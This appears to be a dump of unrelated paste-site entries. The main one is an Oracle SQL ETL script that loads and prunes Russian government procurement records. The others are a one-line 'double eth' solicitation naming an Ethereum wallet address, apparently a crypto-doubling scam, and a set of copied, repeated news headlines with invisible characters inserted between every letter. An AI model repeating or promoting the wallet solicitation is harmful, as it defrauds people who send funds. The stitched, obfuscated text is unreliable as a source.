             When con.placing In ('20000') or con.placing Is Null And con.singlecustomer Is Not Null Then 'Закупка у единственного поставщика (подрядчика, исполнителя)'
             When con.placing In ('11013') Then 'Открытый конкурс в электронной форме'
             When con.placing In ('11031','11033') Then 'Двухэтапный конкурс в электронной форме'
             When con.placing In ('13011') Then 'Запрос котировок'
             When con.placing In ('11023') Then 'Конкурс с ограниченным участием в электронной форме'
             When con.placing In ('30000') Then 'Способ определения поставщика (подрядчика, исполнителя),  установленный правительством российской федерации в соответствии со статьей 111 федерального закона'
             When con.placing In ('14011') Then 'Запрос предложений'
             When con.placing In ('11011') Then 'Открытый конкурс'
             When con.placing In ('11042') Then 'Закрытый конкурс'
             When con.placing In ('11021') Then 'Конкурс с ограниченным участием'
             When con.placing In ('12022') Then 'Закрытый аукцион'
             Else Null
        End sop_name,
        rs.name,
        Case 
            When lower(con.contractstage) = 'e' Then 'Исполнение'
            When lower(con.contractstage) = 'et' Then 'Исполнение прекращено'
            When lower(con.contractstage) = 'ec' Then 'Исполнение завершено'
            When lower(con.contractstage) = 'in' Then 'Аннулировано'
		Else Null End stage,
        con.startdate,
        con.enddate, --Плановая дата исполнения контракта
        con.rejectiondate, --дата расторжения контракта
        to_number(2024) finyear, --год финансирования
        con.targetexpenseitemcode, --целевая статья
        t.np_code_name, t.fp_code_name,
        case when proc.targetexpenseitemcode in ( select targetexpenseitemcode from dwh_targetexpenseitemcode_aip ) and con.kvr not in ('244') then 'Да' else 'Нет'    
        end priznak,--Признак совпадения целевой статьи (АИП)
        -- Case When con.exec_startyear=2022 Then exec_stageprice ELse null End fact,
        null fact,
        null lotid,
        Case When maxprice>=40000000 Then 1 Else 0 End, --uoplacing 
        null uo_org,
        con.contractsubject,
        con.supplier_inn,
        con.supplier_fullname,
        con.supplierkpp,
        org.contragent_account, --код заказчика
        null contractactualpaid, --фактически оплачено всего
        null fulfilment_sum,
        null date_notice_published,
        null price_type,
        con.suppliertype,
        con.rtc_price,
        con.supply_impossible

From con
join dwh_organization_kgntv org On con.responsibleorg_fullname=org.full_name and con.rn=1 --убрал правило из блока con не попадали нужные контракты пример 2782536397817000116
Left join proc On con.notificationnumber=proc.purchasenumber
Left Join contract_single_supp_reasons rs On rs.code_oos = con.singlecustomer And rs.actual = 1
Left Join dwh_targetexpenseitemcode_2020 t on t.targetexpenseitemcode=con.targetexpenseitemcode
Left Join dwh_schedule_pos_2020_kgntv pos On pos.pg_rn=Case when con.positionnumber is not null then con.positionnumber Else proc.positionnumber End
left join dwh_vg_22 vg On vg.grbs_id=org.parentid
Left join (
            Select positionnumber, purchasecode, tenderplan 
            from (
                    select row_number() over (PARTITION BY positionnumber, docpublishdate order by positionnumber) rn, t.*       
                    from dwh_start_notice_nrpz t
                    where (t.positionnumber, t.docpublishdate) in ( Select positionnumber, max(docpublishdate)docpublishdate from dwh_start_notice_nrpz group by positionnumber) 
                 )
             where rn =1
          ) notice On notice.positionnumber= Case when con.positionnumber is not null then con.positionnumber Else proc.positionnumber End
Where org.id<>1610 --16.11.2021 Письмо Крицкой Л.А.          
;"
rpQ9Fshk,Untitled,GLASHATAY_007,Oracle 11,Tuesday 23rd of April 2024 09:06:12 AM CDT,"truncate table dwh_detailing_zak_general_2024;
insert into dwh_detailing_zak_general_2024
With 
proc As (
            Select *
            From (
                    Select p.*, ROW_NUMBER() Over (Partition By p.purchasenumber Order By p.docpublishdate desc) rn
                    From dwh_procedures_delegated p
                 ) p
            Where rn=1     
         ),
con As (
            Select distinct notificationnumber
            From dwh_contracts_delegated c
            where (c.contract_regnum, c.versionnumber) In (
                                                             Select contract_regnum, Max(versionnumber)
                                                             From dwh_contracts_delegated
                                                             Group by contract_regnum
                                                          )
        )   
Select Case When pro.orgid='141053' Then '146504' Else pro.orgid End orgid, --в связи с тем, что данный садик реорганзивался в садик с ИНН=7820076257 необходимо суммировать
       pro.ORGTITLE, org.short_name, 
       Case WHen org.inn='7820075581' Then '7820076257' Else org.inn End inn, --в связи с тем, что данный садик реорганзивался в садик с ИНН=7820076257 необходимо суммировать
       org.kpp,  pro.GRBSTITLE, org.grbs_inn, pro.grbsid, vg.vg_name vg,
       pro.pg_ikz,  pro.pg_n, pro.pg_rn, pro.ikz, --ИКЗ из извещения
       pro.reqnum,  coalesce(pro.DATE_DEMAND_START,pro.first_notice_try) first_notice_try, --  Дата первой успешно отправленной версии извещения (xml-пакета)в ЕИС ( НЕ ВСЕГДА = Дате публикации извещения)  
       case when pro.joflag=1 then 1 else 0 end sovm,
       cons.orgtitle c_org,
       case when pro.placement='Централизованная закупка' then 1 else 0 end centr,
       fin.flag_pp, --в рамках ч.6п.15 (переданные полномочия)      
       pro.orgtitle org_pp, --организац, осуществляющая полномочия заказчика 
       Case When (pro.sed_reg_number Is Not Null or pro.request_order_number Is Not Null) Then 1 Else 0 End UOPLACING, 
       uo_org.FULL_NAME uo_org,
       fin.LOTUUID, 
       fin.finyear, -- год финансирования
       fin.TARGETEXPENSEITEMCODE, 
       t.NP_CODE_NAME,t.FP_CODE_NAME,
       case when fin.targetexpenseitemcode in ( Select targetexpenseitemcode From dwh_targetexpenseitemcode_aip ) and fin.expensetypecode not in '244'  
       or (fin.targetexpenseitemcode in ('022E15305F','021E15305F') and fin.expensetypecode='414' and fin.kosgucode='310' and pro.orgid='1506') -- правило по письму крицкой от 5.10.222       
            Then 'Да' else 'Нет'     
        end priznak,--Признак совпадения целевой статьи (АИП)
       pro.F_PRODUCTPRICE, fin.FINSUM, fin.budget_type, fin.expensetypecode, fin.kosgucode,fin.fundcode,
       pro.REQUESTID,
       pro.LOTSTAGE,
       pro.FORDERTYPENAME, pro.ONEEXEC,pro.SUBJECT, org.CONTRAGENT_ACCOUNT,
       pro.date_notice_published-- Дата размещения первой версии извещения на ЕИС    
From FIN_TARG_ZAK_2024_table fin -- 28.09.22 создана таблица с инф-цией по финансированию закупок(с 3-мя union)
  Join dwh_procedures_kgntv pro on nvl(pro.lot_cons_m,pro.lotuuid)=fin.lotuuid 
                                   And(( ((pro.lot_cons_m=pro.lotuuid and pro.mord_flag='M') or pro.lot_cons_m Is Null) -- берем только мать pro.lot_cons_m=pro.lotuuid and pro.mord_flag='M'
                                   And pro.reqnum Not In (Select reqnum From wrong_purchase)
								   And pro.reqnum Is Not Null
								   And ( pro.final_decision <>'Отмена закупки' or pro.final_decision is null) 
								   And pro.lotstageid not in (93,100,146,61) -- 93 Процедура отменена, 
  																	      -- 100 - обновление от 27.09.2019 корректировка Яковлева А.И. (не учитывать статус закупка не состоялась)
																		  -- 146 Закупка отменена от 03.12.2021 Крицкая Л.А. 
																		  -- 61 Исполнение контракта
								   And pro.orgid in (Select id From dwh_organization_not_zak ) --необходимо убрать учреждения законодательной власти  
								   And pro.orgid<>1610 --16.11.2021 Письмо Крицкой Л.А.)
								   )or pro.lotuuid=4996697 -- Выключить закупку при переходе в стадию по заключению контракта
                                   ) 
  Join dwh_organization_kgntv   org on org.id=pro.orgid 
  Left Join dwh_targetexpenseitemcode_2020 t on t.targetexpenseitemcode=fin.targetexpenseitemcode
  Left Join dwh_contract_kgntv con on fin.lotuuid=con.lotid 
  Left Join dwh_organization_kgntv uo_org on uo_org.id = pro.uo_orgid  
  Left Join dwh_procedures_cons_kgntv cons on cons.lotuuid = pro.Joint_procedure_id
  Left Join dwh_vg_22 vg on vg.grbs_id = pro.grbsid
  Left Join (
                Select distinct purchasenumber 
                From dwh_protocol_nrpz_acgz  	
                where TYPE in('fcsProtocolDeviation', 'fcsProtocolEvasion', 'epProtocolEvasion', 'epProtocolDeviation') 
            ) prot On prot.purchasenumber=pro.reqnum 
  Left Join ( 
                Select distinct purchasenumber
                From dwh_start_notice_canc_acgz
            ) canc on canc.purchasenumber=pro.reqnum
  Left Join (Select distinct purchasenumber From dwh_notice_prolong_nrpz) notice on notice.purchasenumber=pro.reqnum           
  where   con.CONTRACTRNK is null 
        And prot.purchasenumber is null -- Крицкая Л.А. 19.04.2021 Убрать закупки, в которых есть ""уклонение участника или отказ заказчика от заключения контракта""
        And canc.purchasenumber is null -- Крицкая Л.А. 19.04.2021 Убрать закупки, у которых есть протокол извещения об отмене        
        And pro.reqnum not in ( 
                                Select distinct reqnum 
                                From dwh_procedures_kgntv pro
                                Join dwh_contract_kgntv con On con.lotid=pro.lotuuid
                                Where pro.reqnum Is Not Null
                              ) -- Крицкая Л.А. 19.04.2021 Убрать совместные закупки, если по извещению есть хоть один контракт
        And case when pro.lotstage='Закупка не состоялась (продление сроков подачи заявок)' And notice.purchasenumber is null then 1 else 0 end = 0 --Крицкая Л.А. письмо от 24.06.2021 
		
union all

Select  to_char(org.id) orgid, proc.responsibleorg_fullname,org.short_name, org.inn, org.kpp, 
        org.grbs_full_name, org.grbs_inn, to_char(org.parentid) grbsid, vg.vg_name vg,
        pos.pg_ikz pg_ikz, proc.plannumber,proc.positionnumber, proc.purchasecode, proc.purchasenumber,
        null first_notice_try,
        0 As sovm,
        null As c_org,
        0 As centr,
        1 flag_pp,
        proc.responsibleorg_fullname org_pp,
        Case When maxprice>=40000000 Then 1 Else 0 End, --uoplacing 
        null uo_org,
        null lotuuid,
        2024 finyear, --год финансирования
        proc.targetexpenseitemcode,
        t.np_code_name, t.fp_code_name,
        case when proc.targetexpenseitemcode in ( Select targetexpenseitemcode From dwh_targetexpenseitemcode_aip ) and to_number(proc.kvr) not in (244) then 'Да' else 'Нет'              
        end priznak,--Признак совпадения целевой статьи (АИП)
        proc.maxprice,
        Case
            When proc.currentyear is null Then null
            When 2024 = proc.currentyear then proc.finsum_currentyear 
            When 2024-1 = proc.currentyear then proc.finsum_firstyear 
            When 2024-2 = proc.currentyear then proc.finsum_secondyear 
        end finsum,
        null budjet_type,--тип финансирования
        to_number(proc.kvr) kvr,
        null kosgu,--КОСГУ
		null fundcode, -- Код фонда
        null requestid,
        null status,
        proc.placingway_name,
        null onex,
        purchaseobjectinfo
        , org.CONTRAGENT_ACCOUNT,    
        null date_notice_published
From proc 
Left Join con On proc.purchasenumber=con.notificationnumber
Left Join dwh_organization_kgntv org on proc.responsibleorg_fullname=org.full_name
Left Join dwh_schedule_pos_2020_kgntv pos On pos.pg_rn=proc.positionnumber
Left Join dwh_targetexpenseitemcode_2020 t On t.targetexpenseitemcode=proc.targetexpenseitemcode
Left Join dwh_vg_22 vg On vg.grbs_id=org.parentid
Left Join (
            Select distinct purchasenumber 
            From dwh_protocol_nrpz_acgz  	
            where TYPE in('fcsProtocolDeviation', 'fcsProtocolEvasion', 'epProtocolEvasion', 'epProtocolDeviation') 
        ) prot On prot.purchasenumber=proc.purchasenumber 
Left Join ( 
            Select distinct purchasenumber
            From dwh_start_notice_canc_acgz
        ) canc on canc.purchasenumber=proc.purchasenumber
Left Join (Select distinct purchasenumber From dwh_notice_prolong_nrpz) notice on notice.purchasenumber=proc.purchasenumber 
Left Join (Select distinct reqnum From dwh_procedures_kgntv) p On p.reqnum=proc.purchasenumber
Where proc.purchasenumber Is Not Null And con.notificationnumber is null
And Case
            When currentyear is null Then 0
            When 2024 = currentyear And finsum_currentyear<>0 then 1 
            When 2024-1 = currentyear And finsum_firstyear <>0 then 1 
            When 2024-2 = currentyear And finsum_secondyear<>0 then 1 
            ELse 0
    end =1
And prot.purchasenumber is null -- Крицкая Л.А. 19.04.2021 Убрать закупки, в которых есть ""уклонение участника или отказ заказчика от заключения контракта""
And canc.purchasenumber is null -- Крицкая Л.А. 19.04.2021 Убрать закупки, у которых есть протокол извещения об отмене    
And p.reqnum is null --Необходимо убрать те извещения, которые уже есть в АИСГЗ
And proc.responsibleorg_fullname<>'ФЕДЕРАЛЬНОЕ ГОСУДАРСТВЕННОЕ БЮДЖЕТНОЕ УЧРЕЖДЕНИЕ КУЛЬТУРЫ ""ГОСУДАРСТВЕННЫЙ МУЗЕЙ-ЗАПОВЕДНИК ""ПАВЛОВСК""'
And proc.purchasenumber not in (Select reqnum From wrong_purchase);

-- Удаляем закупки у которых нет протокола подведения итогов определения поставщика и прошло более 50 рабочих дней с момента публикации первой версии извещения
DELETE FROM dwh_detailing_zak_general_2024
WHERE reqnum in 
(SELECT reqnum FROM dwh_detailing_zak_general_2024 z
  LEFT JOIN (
      SELECT purchasenumber, 
             type, 
            max(protocoldate) protocolopr ,
            protocolnumber
        FROM dwh_protocol_nrpz_acgz
       WHERE type in (
                        'epProtocolEOK3',
                        'epProtocolEZK2020Final',
                        'epProtocolEOKOU3',
                        'epProtocolEOK2020Final',
                        'fcsProtocolEF3',
                        'epProtocolEF2020Final',
                        'epProtocolEZT2020FinalPart')
       GROUP BY purchasenumber, type, protocolnumber) prot on z.reqnum = prot.purchasenumber
       Left Join (
	Select Distinct
		protocolnumber,
		purchasenumber,
        protocoldate
	From dwh_protocol_nrpz_acgz
	Where type In ('ProtocolCancel','fcsProtocolCancel','epProtocolCancel') 
		  ) canc On canc.protocolnumber = prot.protocolnumber And canc.purchasenumber = prot.purchasenumber And prot.protocolopr < canc.protocoldate
WHERE (case when sysdate > (SELECT min(t.date_)
                              FROM work_Days_of_2019 t 
                              JOIN work_Days_of_2019 t1 on (t.date_>t1.date_ and t.nm=t1.nm+50)
                             WHERE t1.date_ >= (SELECT min(date_)
                                                  FROM work_Days_all
                                                 WHERE DATE_ >= (trunc(z.first_notice_try)) and type=1)) and (/*protocolopr is null or*/ canc.protocolnumber is /*not*/ null) then 1 else 0 end ) = 1)"
5RVKpQ3r,wallet,BrainRTP,Lua,Tuesday 23rd of April 2024 09:03:57 AM CDT,"double eth

send to 0x650e6888511805f92E7A9A833E354da3D7D24766"
Fe6pGZCb,News April23 24,Newscaster_Ned,Email,Tuesday 23rd of April 2024 08:48:26 AM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎

T‎i‎m‎e‎ ‎f‎o‎r‎ ‎a‎n‎ ‎u‎p‎d‎a‎t‎e‎ ‎o‎n‎ ‎t‎h‎e‎ ‎m‎o‎n‎k‎e‎y‎s‎.‎

D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎G‎a‎g‎g‎e‎d‎ ‎a‎s‎ ‎W‎i‎t‎n‎e‎s‎s‎ ‎M‎i‎c‎h‎a‎e‎l‎ ‎C‎o‎h‎e‎n‎ ‎C‎a‎l‎l‎s‎ ‎H‎i‎m‎ ‎'‎V‎o‎n‎ ‎S‎h‎i‎t‎z‎I‎n‎P‎a‎n‎t‎z‎'‎
O‎u‎s‎t‎e‎d‎ ‎T‎e‎x‎a‎s‎ ‎B‎i‎s‎h‎o‎p‎ ‎D‎e‎n‎o‎u‎n‎c‎e‎s‎ ‎‘‎S‎i‎l‎e‎n‎t‎ ‎S‎h‎e‎p‎h‎e‎r‎d‎s‎,‎’‎ ‎‘‎C‎o‎r‎r‎u‎p‎t‎ ‎V‎a‎t‎i‎c‎a‎n‎’‎
S‎w‎e‎d‎e‎n‎ ‎S‎e‎i‎z‎e‎s‎ ‎1‎.‎4‎ ‎T‎o‎n‎s‎ ‎o‎f‎ ‎C‎o‎c‎a‎i‎n‎e‎
T‎w‎o‎ ‎R‎e‎a‎s‎o‎n‎s‎ ‎B‎i‎d‎e‎n‎ ‎F‎a‎c‎e‎s‎ ‎'‎T‎o‎u‎g‎h‎e‎r‎'‎ ‎E‎l‎e‎c‎t‎o‎r‎a‎l‎ ‎C‎o‎l‎l‎e‎g‎e‎ ‎P‎a‎t‎h‎ ‎t‎o‎ ‎2‎7‎0‎
T‎o‎m‎m‎y‎ ‎R‎o‎b‎i‎n‎s‎o‎n‎ ‎C‎l‎e‎a‎r‎e‎d‎ ‎a‎s‎ ‎J‎u‎d‎g‎e‎ ‎R‎u‎l‎e‎s‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎B‎a‎n‎ ‎W‎a‎s‎ ‎'‎U‎n‎l‎a‎w‎f‎u‎l‎'‎
‘‎A‎ ‎K‎n‎i‎g‎h‎t‎’‎s‎ ‎T‎a‎l‎e‎’‎ ‎D‎i‎r‎e‎c‎t‎o‎r‎:‎ ‎N‎e‎t‎f‎l‎i‎x‎ ‎A‎l‎g‎o‎r‎i‎t‎h‎m‎ ‎R‎e‎j‎e‎c‎t‎e‎d‎ ‎S‎e‎q‎u‎e‎l‎ ‎w‎i‎t‎h‎ ‎F‎e‎m‎a‎l‎e‎
R‎a‎n‎d‎ ‎P‎a‎u‎l‎ ‎D‎e‎m‎a‎n‎d‎s‎ ‎A‎n‎s‎w‎e‎r‎s‎ ‎o‎n‎ ‎D‎a‎n‎g‎e‎r‎o‎u‎s‎ ‎B‎i‎o‎l‎a‎b‎s‎
N‎B‎C‎ ‎N‎e‎w‎s‎ ‎P‎o‎l‎l‎:‎ ‎T‎r‎u‎m‎p‎ ‎M‎o‎r‎e‎ ‎'‎C‎o‎m‎p‎e‎t‎e‎n‎t‎'‎ ‎t‎h‎a‎n‎ ‎B‎i‎d‎e‎n‎,‎ ‎U‎p‎ ‎2‎1‎ ‎P‎o‎i‎n‎t‎s‎ ‎S‎i‎n‎c‎e‎ ‎2‎0‎2‎0‎ ‎
C‎a‎r‎t‎e‎l‎ ‎G‎u‎n‎m‎e‎n‎ ‎D‎u‎m‎p‎ ‎8‎ ‎B‎o‎d‎i‎e‎s‎ ‎o‎n‎ ‎M‎e‎x‎i‎c‎a‎n‎ ‎B‎o‎r‎d‎e‎r‎ ‎S‎t‎a‎t‎e‎ ‎H‎i‎g‎h‎w‎a‎y‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎A‎d‎v‎i‎s‎e‎r‎:‎ ‎T‎w‎o‎ ‎R‎e‎a‎s‎o‎n‎s‎ ‎B‎i‎d‎e‎n‎ ‎F‎a‎c‎e‎s‎ ‎‘‎T‎o‎u‎g‎h‎e‎r‎’‎ ‎E‎l‎e‎c‎t‎o‎r‎a‎l‎ ‎C‎o‎l‎l‎e‎g‎e‎ ‎P‎a‎t‎h‎ ‎t‎o‎ ‎2‎7‎0‎
B‎i‎d‎e‎n‎ ‎U‎n‎e‎m‎p‎l‎o‎y‎m‎e‎n‎t‎
P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎f‎a‎c‎e‎s‎ ‎a‎ ‎m‎u‎c‎h‎ ‎“‎t‎o‎u‎g‎h‎e‎r‎”‎ ‎p‎a‎t‎h‎ ‎t‎h‎a‎n‎ ‎h‎i‎s‎ ‎o‎p‎p‎o‎n‎e‎n‎t‎ ‎t‎o‎ ‎o‎b‎t‎a‎i‎n‎ ‎t‎h‎e‎ ‎2‎7‎0‎ ‎e‎l‎e‎c‎t‎o‎r‎a‎l‎ ‎c‎o‎l‎l‎e‎g‎e‎ ‎v‎o‎t‎e‎s‎ ‎n‎e‎e‎d‎e‎d‎ ‎t‎o‎ ‎w‎i‎n‎ ‎t‎h‎e‎ ‎p‎r‎e‎s‎i‎d‎e‎n‎t‎i‎a‎l‎ ‎e‎l‎e‎c‎t‎i‎o‎n‎,‎ ‎l‎o‎n‎g‎t‎i‎m‎e‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎ ‎a‎d‎v‎i‎s‎e‎r‎ ‎D‎o‎u‎g‎ ‎S‎o‎s‎n‎i‎k‎ ‎w‎r‎o‎t‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎T‎i‎m‎e‎s‎.‎

S‎h‎o‎u‎l‎d‎ ‎M‎e‎r‎r‎i‎c‎k‎ ‎G‎a‎r‎l‎a‎n‎d‎ ‎b‎e‎ ‎i‎m‎p‎e‎a‎c‎h‎e‎d‎?‎

Y‎E‎S‎N‎O‎
M‎O‎S‎T‎ ‎P‎O‎P‎U‎L‎A‎R‎
W‎A‎T‎C‎H‎:‎ ‎A‎n‎t‎i‎-‎I‎s‎r‎a‎e‎l‎ ‎P‎r‎o‎t‎e‎s‎t‎e‎r‎s‎ ‎a‎t‎ ‎C‎o‎l‎u‎m‎b‎i‎a‎ ‎C‎h‎a‎n‎t‎ ‎P‎r‎o‎-‎T‎e‎r‎r‎o‎r‎ ‎S‎l‎o‎g‎a‎n‎s‎
W‎A‎T‎C‎H‎:‎ ‎A‎n‎t‎i‎-‎I‎s‎r‎a‎e‎l‎ ‎P‎r‎o‎t‎e‎s‎t‎e‎r‎s‎ ‎a‎t‎ ‎C‎o‎l‎u‎m‎b‎i‎a‎ ‎C‎h‎a‎n‎t‎ ‎P‎r‎o‎-‎T‎e‎r‎r‎o‎r‎ ‎S‎l‎o‎g‎a‎n‎s‎
4‎,‎7‎8‎4‎
A‎l‎i‎n‎a‎ ‎H‎a‎b‎b‎a‎:‎ ‎C‎r‎i‎m‎i‎n‎a‎l‎ ‎a‎n‎d‎ ‎C‎i‎v‎i‎l‎ ‎C‎o‎u‎r‎t‎s‎ ‎B‎e‎i‎n‎g‎ ‎U‎s‎e‎d‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎T‎r‎u‎m‎p‎ ‎B‎e‎c‎a‎u‎s‎e‎ ‎‘‎T‎h‎e‎y‎ ‎C‎a‎n‎n‎o‎t‎ ‎B‎e‎a‎t‎ ‎H‎i‎m‎
H‎a‎b‎b‎a‎:‎ ‎C‎o‎u‎r‎t‎s‎ ‎B‎e‎i‎n‎g‎ ‎U‎s‎e‎d‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎T‎r‎u‎m‎p‎ ‎B‎e‎c‎a‎u‎s‎e‎ ‎T‎h‎e‎y‎ ‎C‎a‎n‎'‎t‎ ‎B‎e‎a‎t‎ ‎H‎i‎m‎ ‎i‎n‎ ‎P‎o‎l‎l‎s‎
4‎,‎9‎3‎3‎
G‎O‎P‎ ‎R‎e‎p‎.‎ ‎C‎a‎r‎l‎ ‎P‎r‎e‎d‎i‎c‎t‎s‎ ‎B‎a‎c‎k‎l‎a‎s‎h‎ ‎f‎r‎o‎m‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎ ‎C‎o‎m‎m‎u‎n‎i‎t‎y‎ ‎f‎o‎r‎ ‎M‎e‎m‎b‎e‎r‎s‎ ‎W‎h‎o‎ ‎T‎u‎r‎n‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎S‎p‎e‎a‎k‎e‎r‎ ‎J‎o‎h‎n‎s‎
C‎a‎r‎l‎ ‎P‎r‎e‎d‎i‎c‎t‎s‎ ‎B‎a‎c‎k‎l‎a‎s‎h‎ ‎f‎r‎o‎m‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎ ‎C‎o‎m‎m‎u‎n‎i‎t‎y‎ ‎o‎v‎e‎r‎ ‎S‎p‎e‎a‎k‎e‎r‎ ‎J‎o‎h‎n‎s‎o‎n‎
2‎4‎2‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎A‎d‎v‎i‎s‎e‎r‎:‎ ‎T‎w‎o‎ ‎R‎e‎a‎s‎o‎n‎s‎ ‎B‎i‎d‎e‎n‎ ‎F‎a‎c‎e‎s‎ ‎‘‎T‎o‎u‎g‎h‎e‎r‎’‎ ‎E‎l‎e‎c‎t‎o‎r‎a‎l‎ ‎C‎o‎l‎l‎e‎g‎e‎ ‎P‎a‎t‎h‎ ‎t‎o‎ ‎2‎7‎0‎
T‎w‎o‎ ‎R‎e‎a‎s‎o‎n‎s‎ ‎B‎i‎d‎e‎n‎ ‎F‎a‎c‎e‎s‎ ‎'‎T‎o‎u‎g‎h‎e‎r‎'‎ ‎E‎l‎e‎c‎t‎o‎r‎a‎l‎ ‎C‎o‎l‎l‎e‎g‎e‎ ‎P‎a‎t‎h‎ ‎t‎o‎ ‎2‎7‎0‎
8‎2‎6‎
M‎S‎N‎B‎C‎’‎s‎ ‎M‎a‎d‎d‎o‎w‎:‎ ‎T‎r‎u‎m‎p‎ ‎‘‎S‎e‎e‎m‎e‎d‎ ‎O‎l‎d‎ ‎a‎n‎d‎ ‎T‎i‎r‎e‎d‎ ‎a‎n‎d‎ ‎M‎a‎d‎’‎ ‎i‎n‎ ‎C‎o‎u‎r‎t‎
M‎S‎N‎B‎C‎'‎s‎ ‎M‎a‎d‎d‎o‎w‎:‎ ‎T‎r‎u‎m‎p‎ ‎'‎S‎e‎e‎m‎e‎d‎ ‎O‎l‎d‎ ‎a‎n‎d‎ ‎T‎i‎r‎e‎d‎ ‎a‎n‎d‎ ‎M‎a‎d‎'‎ ‎i‎n‎ ‎C‎o‎u‎r‎t‎
8‎8‎5‎
O‎b‎a‎m‎a‎’‎s‎ ‎P‎a‎s‎s‎o‎v‎e‎r‎ ‎M‎e‎s‎s‎a‎g‎e‎ ‎A‎d‎d‎s‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎s‎ ‎I‎n‎t‎o‎ ‎t‎h‎e‎ ‎S‎t‎o‎r‎y‎;‎ ‎O‎m‎i‎t‎s‎ ‎H‎o‎s‎t‎a‎g‎e‎s‎
O‎b‎a‎m‎a‎'‎s‎ ‎P‎a‎s‎s‎o‎v‎e‎r‎ ‎M‎e‎s‎s‎a‎g‎e‎ ‎R‎e‎c‎a‎l‎l‎s‎ ‎S‎u‎f‎f‎e‎r‎i‎n‎g‎ ‎i‎n‎ ‎'‎I‎s‎r‎a‎e‎l‎ ‎a‎n‎d‎ ‎G‎a‎z‎a‎'‎
8‎4‎2‎
D‎e‎m‎ ‎R‎e‎p‎ ‎K‎h‎a‎n‎n‎a‎:‎ ‎I‎ ‎W‎o‎u‎l‎d‎ ‎V‎o‎t‎e‎ ‎t‎o‎ ‎P‎r‎o‎t‎e‎c‎t‎ ‎S‎p‎e‎a‎k‎e‎r‎ ‎J‎o‎h‎n‎s‎o‎n‎
D‎e‎m‎ ‎R‎e‎p‎ ‎K‎h‎a‎n‎n‎a‎:‎ ‎I‎ ‎W‎o‎u‎l‎d‎ ‎V‎o‎t‎e‎ ‎t‎o‎ ‎P‎r‎o‎t‎e‎c‎t‎ ‎S‎p‎e‎a‎k‎e‎r‎ ‎J‎o‎h‎n‎s‎o‎n‎
6‎,‎3‎0‎5‎
C‎o‎l‎u‎m‎b‎i‎a‎ ‎M‎o‎v‎e‎s‎ ‎t‎o‎ ‎V‎i‎r‎t‎u‎a‎l‎ ‎C‎l‎a‎s‎s‎e‎s‎ ‎a‎s‎ ‎P‎r‎o‎-‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎ ‎P‎r‎o‎t‎e‎s‎t‎s‎ ‎E‎r‎u‎p‎t‎
C‎o‎l‎u‎m‎b‎i‎a‎ ‎M‎o‎v‎e‎s‎ ‎t‎o‎ ‎V‎i‎r‎t‎u‎a‎l‎ ‎C‎l‎a‎s‎s‎e‎s‎ ‎a‎s‎ ‎P‎r‎o‎-‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎ ‎P‎r‎o‎t‎e‎s‎t‎s‎ ‎E‎r‎u‎p‎t‎
4‎,‎8‎7‎2‎
T‎u‎r‎l‎e‎y‎:‎ ‎T‎r‎u‎m‎p‎ ‎I‎s‎ ‎R‎i‎g‎h‎t‎ ‎—‎ ‎N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎C‎a‎s‎e‎ ‎I‎s‎ ‎a‎n‎ ‎‘‎E‎m‎b‎a‎r‎r‎a‎s‎s‎m‎e‎n‎t‎’‎
T‎u‎r‎l‎e‎y‎:‎ ‎N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎C‎a‎s‎e‎ ‎I‎s‎ ‎a‎n‎ ‎'‎E‎m‎b‎a‎r‎r‎a‎s‎s‎m‎e‎n‎t‎'‎
5‎0‎3‎
T‎o‎m‎m‎y‎ ‎R‎o‎b‎i‎n‎s‎o‎n‎ ‎C‎l‎e‎a‎r‎e‎d‎ ‎o‎f‎ ‎C‎h‎a‎r‎g‎e‎s‎ ‎a‎s‎ ‎J‎u‎d‎g‎e‎ ‎R‎u‎l‎e‎s‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎B‎a‎n‎ ‎W‎a‎s‎ ‎‘‎U‎n‎l‎a‎w‎f‎u‎l‎’‎
T‎o‎m‎m‎y‎ ‎R‎o‎b‎i‎n‎s‎o‎n‎ ‎C‎l‎e‎a‎r‎e‎d‎ ‎a‎s‎ ‎J‎u‎d‎g‎e‎ ‎R‎u‎l‎e‎s‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎B‎a‎n‎ ‎W‎a‎s‎ ‎'‎U‎n‎l‎a‎w‎f‎u‎l‎'‎

